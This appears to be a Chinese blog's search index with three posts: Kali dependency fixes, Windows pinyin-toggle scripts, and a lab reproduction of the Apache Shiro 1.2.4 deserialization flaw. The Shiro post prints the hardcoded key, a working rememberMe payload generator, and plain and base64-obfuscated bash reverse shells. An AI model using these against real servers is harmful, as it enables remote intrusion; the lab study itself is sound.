<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>KaliLinux2021安装GUI_Tools依赖问题</title>
    <url>/2021/11/10/KaliLinux2021%E5%AE%89%E8%A3%85GUI-Tools%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="KaliLinux2021安装GUI-Tools依赖问题"><a href="#KaliLinux2021安装GUI-Tools依赖问题" class="headerlink" title="KaliLinux2021安装GUI_Tools依赖问题"></a>KaliLinux2021安装GUI_Tools依赖问题</h2><h3 id="WxPython库依赖问题"><a href="#WxPython库依赖问题" class="headerlink" title="WxPython库依赖问题"></a>WxPython库依赖问题</h3><hr>
<p> <img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003215057722.png" alt="image-20211003215057722"></p>
<p>需要安装 <code>wxpython</code> 库 , 但是kali 下 pip3 安装, 编译会产生报错, 具体原因 我也不清楚</p>
<p>只能转身去寻找已经编译好了的whl 包, 结果…..竟然没有Linux的包. 呜呜呜~~</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003215508315.png" alt="image-20211003215508315"></p>
<p>只能去全球最大的同性交友网站gayhub 呸~ , <code>github</code> 寻找linux版本</p>
<p>终于在wxpython项目组的站点找到了部分Linux的whl包</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003215853397.png" alt="image-20211003215853397"></p>
<p>没有针对kali 的包, 那就随便冲一个吧 </p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003215930052.png" alt="image-20211003215930052"></p>
<p>看了一下debian , 发现没有 python3.9 版本的 , 但是unbuntu 18.04 有的 , 不管这么多了蒙头冲就对了</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003220147241.png" alt="image-20211003220147241"></p>
<p>下载 , pip install 安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install wxPython-4.1.1-cp39-cp39-linux_x86_64.whl </span><br></pre></td></tr></table></figure>

<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003220307202.png" alt="image-20211003220307202"></p>
<h4 id="第一个依赖问题-libSDL2-2-0-so-0"><a href="#第一个依赖问题-libSDL2-2-0-so-0" class="headerlink" title="第一个依赖问题 libSDL2-2.0.so.0"></a>第一个依赖问题 libSDL2-2.0.so.0</h4><p>#todo  这里少张图 , 缺少 libSDL2-2.0.so.0</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003220519837.png" alt="image-20211003220519837"></p>
<p>谷歌之后, 很快解决了问题</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003220650344.png" alt="image-20211003220650344"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install libsdl2-mixer-2.0-0 libsdl2-image-2.0-0 libsdl2-2.0-0</span><br></pre></td></tr></table></figure>



<h3 id="第二个依赖问题-libjpeg-so-8"><a href="#第二个依赖问题-libjpeg-so-8" class="headerlink" title="第二个依赖问题  libjpeg.so.8"></a>第二个依赖问题  libjpeg.so.8</h3><p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003220412476.png" alt="image-20211003220412476"></p>
<p>百度找到的很多结果是 添加libjpeg.so.8的环境变量 </p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003221123978.png" alt="image-20211003221123978"></p>
<p>但kali机器上没有 libjpeg.so.8 , 呜呜呜</p>
<p> <img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003213536750.png" alt="image-20211003213536750"></p>
<p>emmmm , google 了很久终于找到了 <strong>libjpeg 库的安装</strong> </p>
<h5 id="libjpeg-库的安装"><a href="#libjpeg-库的安装" class="headerlink" title="libjpeg 库的安装"></a>libjpeg 库的安装</h5><p><a href="http://blog.sina.com.cn/s/blog_7956a73c0100wj9s.html">http://blog.sina.com.cn/s/blog_7956a73c0100wj9s.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ijg.org/files/jpegsrc.v8c.tar.gz</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line">＃make test  ==&gt; 测试命令而已</span><br></pre></td></tr></table></figure>

<p> <img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003221447466.png" alt="image-20211003221447466"></p>
<p>A quick fix is to add the directory that contains <code>libjpeg.so.8</code> to your <code>/etc/ld.so.conf</code> file, and then run <code>ldconfig</code></p>
<p>将 路径添加到  <code>/etc/ld.so.conf</code>  ,</p>
<p> <img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003222445141.png" alt="image-20211003222445141"></p>
<p> 然后运行 <code>ldconfig</code></p>
<p>到这里, 图形化界面就行成功运行了</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003221748360.png" alt="image-20211003221748360"></p>
<h3 id="Java-报错"><a href="#Java-报错" class="headerlink" title="Java 报错"></a>Java 报错</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java: Exec format error</span><br></pre></td></tr></table></figure>

<p>这里, 由于自带的java 环境是 mac 系统的程序 , 这里使用Linux环境的java进行替换进行了</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003222318921.png" alt="image-20211003222318921"></p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003210824421.png" alt="image-20211003210824421"></p>
<p>java1.8</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.java.com/en/download/manual.jsp</span><br></pre></td></tr></table></figure>

<p>java 9</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://download.java.net/java/GA/jdk9/9.0.4/binaries/openjdk-9.0.4_linux-x64_bin.tar.gz</span><br></pre></td></tr></table></figure>

<p>修改路径</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003222202425.png" alt="image-20211003222202425"></p>
<h4 id="权限问题"><a href="#权限问题" class="headerlink" title="权限问题"></a>权限问题</h4><p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003210104791.png" alt="image-20211003210104791"></p>
<p>给予 java 执行权限,  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +x -R java_1.8/</span><br><span class="line">chmod +x -R java9/</span><br></pre></td></tr></table></figure>



<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003214916639.png" alt="image-20211003214916639"></p>
<p>写到这, 终于完成了所有依赖问题, 终于可以关闭所有浏览器标签页了 ==手动狗头==</p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>技巧</tag>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows下快速切换全拼/双拼</title>
    <url>/2021/11/09/Windows%E4%B8%8B%E5%BF%AB%E9%80%9F%E5%88%87%E6%8D%A2%E5%85%A8%E6%8B%BC-%E5%8F%8C%E6%8B%BC/</url>
    <content><![CDATA[<h1 id="Windows下快速切换全拼-双拼"><a href="#Windows下快速切换全拼-双拼" class="headerlink" title="Windows下快速切换全拼/双拼"></a>Windows下快速切换全拼/双拼</h1><h2 id="bat批处理文件方式"><a href="#bat批处理文件方式" class="headerlink" title="bat批处理文件方式"></a>bat批处理文件方式</h2><h3 id="change-bat"><a href="#change-bat" class="headerlink" title="change.bat"></a>change.bat</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Mainkey=HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS </span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;reg query <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; ^| <span class="built_in">findstr</span> /i &quot;<span class="number">0</span>x1&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> flg=<span class="variable">%%i</span>) </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> flg ( reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x1 /f ) <span class="keyword">else</span> ( reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x0 /f )</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>


<h3 id="ChangeAll-bat"><a href="#ChangeAll-bat" class="headerlink" title="ChangeAll.bat"></a>ChangeAll.bat</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Mainkey=HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;reg query <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; ^| <span class="built_in">findstr</span> /i &quot;<span class="number">0</span>x1&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> flg=<span class="variable">%%i</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> flg (</span><br><span class="line"><span class="comment">    @REM reg add %MainKey% /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d 0x1 /f</span></span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">    reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x0 /f</span><br><span class="line">)</span><br></pre></td></tr></table></figure>


<h3 id="ChangeDouble-bat"><a href="#ChangeDouble-bat" class="headerlink" title="ChangeDouble.bat"></a>ChangeDouble.bat</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Mainkey=HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;reg query <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; ^| <span class="built_in">findstr</span> /i &quot;<span class="number">0</span>x1&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> flg=<span class="variable">%%i</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> flg (</span><br><span class="line">    reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x1 /f</span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line"><span class="comment">    @REM reg add %MainKey% /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d 0x0 /f</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<h2 id="VBS脚本方式"><a href="#VBS脚本方式" class="headerlink" title="VBS脚本方式"></a>VBS脚本方式</h2><h3 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h3><figure class="highlight vbs"><table><tr><td class="code"><pre><span class="line"><span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>).Run <span class="string">&quot;ChangeAll.bat&quot;</span>,<span class="number">0</span></span><br><span class="line"><span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>).Run <span class="string">&quot;ChangeDouble.bat&quot;</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="uTools插件"><a href="#uTools插件" class="headerlink" title="uTools插件"></a>uTools插件</h2><p>目前已经做成了 uTools 插件 , 插件名称 : <code>切换微软全拼</code></p>
<p>项目地址: <a href="https://github.com/syyu6/utools-ChangeDouble">https://github.com/syyu6/utools-ChangeDouble</a></p>
<p>And so on …</p>
<h2 id="utools快捷命令"><a href="#utools快捷命令" class="headerlink" title="utools快捷命令"></a>utools快捷命令</h2><h3 id="实现-ps1-脚本"><a href="#实现-ps1-脚本" class="headerlink" title="实现 ps1 脚本"></a>实现 ps1 脚本</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$out</span> = reg query HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS /v <span class="string">&quot;Enable Double Pinyin&quot;</span>; </span><br><span class="line"><span class="variable">$outStr</span> = <span class="variable">$out</span> <span class="operator">-as</span> [<span class="built_in">string</span>]; </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$outStr</span> <span class="operator">-match</span> <span class="string">&#x27;(Pinyin.+0x)(\d)&#x27;</span>) &#123;<span class="variable">$mode</span> = <span class="variable">$Matches</span>[<span class="number">2</span>] &#125; <span class="keyword">else</span> &#123; <span class="variable">$mode</span> = <span class="number">1</span> &#125;; </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$mode</span> <span class="operator">-as</span> [<span class="built_in">int</span>] <span class="operator">-eq</span> <span class="number">1</span>) &#123; <span class="variable">$Double</span> = <span class="number">0</span> &#125; <span class="keyword">else</span> &#123; <span class="variable">$Double</span> = <span class="number">1</span> &#125;;</span><br><span class="line">reg.exe add HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS /v <span class="string">&quot;Enable Double Pinyin&quot;</span> /t REG_DWORD /d <span class="variable">$Double</span> /f;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>Windows技巧</category>
      </categories>
      <tags>
        <tag>技巧</tag>
        <tag>杂谈</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro1.2.4反序列化漏洞复现</title>
    <url>/2021/11/28/shiro1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="shiro-反序列化漏洞复现"><a href="#shiro-反序列化漏洞复现" class="headerlink" title="shiro 反序列化漏洞复现"></a>shiro 反序列化漏洞复现</h1><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>Apache Shiro 是一个开源安全框架，提供身份验证、授权、密码学和会话管理。在它编号为 550 的 issue 中爆出严重的 Java 反序列化漏洞。</p>
<p>在 Apache Shiro&lt;=1.2.4 版本中 AES 加密时采用的 key 是<strong>硬编码</strong>在代码中的，这就为伪造 cookie 提供了机会。只要 rememberMe 的 AES 加密密钥泄露，无论 shiro 是什么版本都会导致反序列化漏洞。</p>
<p>Shiro 的 “记住我” 功能是设置 cookie 中的 rememberMe 值来实现。当后端接收到来自未经身份验证的用户的请求时，它将通过执行以下操作来寻找他们记住的身份：</p>
<ol>
<li> 检索 cookie 中 RememberMe 的值</li>
<li> Base64 解码</li>
<li> 使用 AES 解密</li>
<li> 反序列化</li>
</ol>
<p>漏洞原因在于第三步，在 Apache Shiro&lt;=1.2.4 版本中 AES 加密时采用的 key 是<strong>硬编码</strong>在代码中的，于是我们就可以构造 RememberMe 的值，然后让其反序列化执行。</p>
<blockquote>
<p>  只要 rememberMe 的 AES 加密密钥泄露，无论 shiro 是什么版本都会导致反序列化漏洞。</p>
</blockquote>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>Windows10 + IDEA</strong>  </p>
<p><strong>shiro 1.2.4</strong></p>
<p><strong>tomcat 8.5.73</strong></p>
<p>下载 shiro 1.2.4</p>
<p>github地址: <a href="https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4">https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4</a></p>
<p>或者 clone shiro源码 , 切换 1.2.4 有漏洞的版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/apache/shiro.git  </span><br><span class="line">cd shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure>

<h3 id="使用-IDEA-进行环境搭建"><a href="#使用-IDEA-进行环境搭建" class="headerlink" title="使用 IDEA 进行环境搭建"></a>使用 IDEA 进行环境搭建</h3><p>打开 samples/web/pom.xml , 支持 jsp</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  这里需要将jstl设置为1.2 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  添加commons-collections4 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用 IDEA 运行 , 先配置 运行环境</p>
<p>添加 TomcatSever (local) , 配置 Tomcat 路径</p>
<blockquote>
<p>  tomcat8 下载地址: <a href="https://tomcat.apache.org/download-80.cgi">https://tomcat.apache.org/download-80.cgi</a>  </p>
</blockquote>
<p><strong>添加部署工件</strong>  “<code>samples-web:war</code>“</p>
<p> <img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211127120409881.png" alt="image-20211127120409881"></p>
<p><strong>详细配置信息</strong></p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211127120912994.png" alt="image-20211127120912994"></p>
<p><strong>运行截图</strong></p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211127121337330.png" alt="image-20211127121337330"></p>
<h3 id="使用-Vulhub-Docker-搭建"><a href="#使用-Vulhub-Docker-搭建" class="headerlink" title="使用 Vulhub Docker 搭建"></a>使用 Vulhub Docker 搭建</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/shiro/CVE-2016-4437</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>



<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211127172017961.png" alt="image-20211127172017961"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p> <strong>payload生成过程</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值</span><br></pre></td></tr></table></figure>

<h3 id="vulhub-Docker-环境"><a href="#vulhub-Docker-环境" class="headerlink" title="vulhub Docker 环境"></a>vulhub Docker 环境</h3><p>使用<code>ysoserial</code>生成CommonsBeanutils1的Gadget：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ./ysoserial.jar CommonsBeanutils1 <span class="string">&quot;touch /tmp/success&quot;</span> &gt; poc.ser</span><br><span class="line">java -jar ./ysoserial.jar CommonsCollections2 <span class="string">&quot;touch /tmp/success&quot;</span> &gt; poc.ser</span><br></pre></td></tr></table></figure>

<p>ysoserial 项目地址: <a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
<p>shiro 1.2.4 版本 , 使用的是默认key: <code>kPH+bIxk5D2deZiIxcaaaA==</code></p>
<p>AES加密 cc链 , 为rememberMe的Cookie值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span>(<span class="params">command</span>):</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial-master-SNAPSHOT.jar&#x27;</span>, <span class="string">&#x27;CommonsBeanutils1&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS   = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key  =  <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    iv   =  uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])  </span><br><span class="line">    <span class="comment"># payload = encode_rememberme(&quot;touch /tmp/123456&quot;)</span></span><br><span class="line">    <span class="comment"># with open(&quot;payload.cookie&quot;, &quot;w&quot;) as fpw:</span></span><br><span class="line">        <span class="comment"># print(&quot;rememberMe=&#123;&#125;&quot;.format(payload.decode()), file=fpw)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br></pre></td></tr></table></figure>

<p>运行脚本, 得到payload </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python test.py &quot;touch /tmp/123456&quot;</span><br></pre></td></tr></table></figure>

<p>发送请求包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 加 -I 是只看响应头，这里主要关注set-cookie:rememberMe</span><br><span class="line">curl -X GET http://192.168.56.106:8080/ --cookie “xxxxxxxxxxxxx” -I</span><br></pre></td></tr></table></figure>

<p>或者使用Burp抓包发送</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211127171801129.png" alt="image-20211127171801129"></p>
<p>查看靶机, 可以看到已经生成了 </p>
<p> <img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211127171631781.png" alt="image-20211127171631781"></p>
<p>反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.56.1/9090 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>但是这条命令却没有成功执行, 应该是部分字符被编码导致的</p>
<p>bash命令 混淆, <a href="https://www.jackson-t.ca/runtime-exec-payloads.html">https://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEvOTA5MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>

<p>成功接收命令 , 反弹shell成功</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211127193448038.png" alt="image-20211127193448038"></p>
<h3 id="windows-10-IDEA"><a href="#windows-10-IDEA" class="headerlink" title="windows 10 + IDEA"></a>windows 10 + IDEA</h3><p>添加  commons-collections4 , 这样才能使用 CommonsCollections2 链 进行攻击</p>
<p>打开 samples/web/pom.xml </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  添加commons-collections4 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用 CommonsCollections2 链 ,  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python .\test.py <span class="string">&quot;ping 4bwtjr.dnslog.cn&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128125802999.png" alt="image-20211128125802999"></p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Shiro 550 反序列化漏洞存在版本：shiro &lt;1.2.4，产生原因是因为shiro接受了Cookie里面<code>rememberMe</code>的值，然后去进行Base64解密后，再使用aes密钥解密后的数据，进行反序列化。</p>
<p>反过来思考一下，如果我们构造该值为一个cc链序列化后的值进行该密钥aes加密后进行base64加密，那么这时候就会去进行反序列化我们的payload内容，这时候就可以达到一个命令执行的效果。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取rememberMe值 -&gt; Base64解密 -&gt; AES解密 -&gt; 调用readobject反序列化操作</span><br></pre></td></tr></table></figure>



<h3 id="序列化过程"><a href="#序列化过程" class="headerlink" title="序列化过程"></a>序列化过程</h3><p>先找到 硬编码 key 的位置 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">org/apache/shiro/mgt/AbstractRememberMeManager.java</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128141909881.png" alt="image-20211128141909881"></p>
<p>向上溯源：找到RememberMeManager类的onSuccessfulLogin方法</p>
<p>onSuccessfulLogin  :  处理成功登录的过程</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128142133893.png" alt="image-20211128142133893"></p>
<p>在这里下一个断点 ,  调试运行</p>
<p>浏览器登录 , 查看 调试信息</p>
<blockquote>
<p>  ps :  记得勾选 rememberMe </p>
</blockquote>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128142417090.png" alt="image-20211128142417090"></p>
<p><strong>IDEA 调试信息</strong></p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128142028947.png" alt="image-20211128142028947"></p>
<p>跳转进入 forgetIdentity 函数 , </p>
<p>继续跟进this.forgetIdentity方法，进入了getCookie的removeFrom方法</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128144648004.png" alt="image-20211128144648004"></p>
<p>跟进removeFrom方法</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128152117310.png" alt="image-20211128152117310"></p>
<p>这里获取看配置信息，最后 addCookieHeader 放到了返回包中的cookie头中，</p>
<p>其中就有熟悉的 deleteMe 字段和 rememberMe 字段，</p>
<p>继续回到 onSuccessfulLogin 方法 , 这个isRememberMe主要是检查选择了remember me这个按钮没有</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128151657293.png" alt="image-20211128151657293"></p>
<p>在rememberIdentity方法中，authcInfo的值就是我们输入root用户名</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128171331211.png" alt="image-20211128171331211"></p>
<p>进入convertPrincipalsToBytes方法，发现它会序列化，而且序列化的是传入的root用户名</p>
<p>然后就是进行普通的序列化操作，再然后调用encrypto方法加密序列化后的二进制字节</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128194709551.png" alt="image-20211128194709551"></p>
<p>getCipherService 获取加密服务 ， 加密方法为 <code>AES/CBC/PKCS5Padding</code></p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128194925238.png" alt="image-20211128194925238"></p>
<p><code>getEncryptionCipherKey()</code> 方法 获取 加密密钥KEY</p>
<p>经过一系列跳转后, 拿到KEY</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128200340907.png" alt="image-20211128200340907"></p>
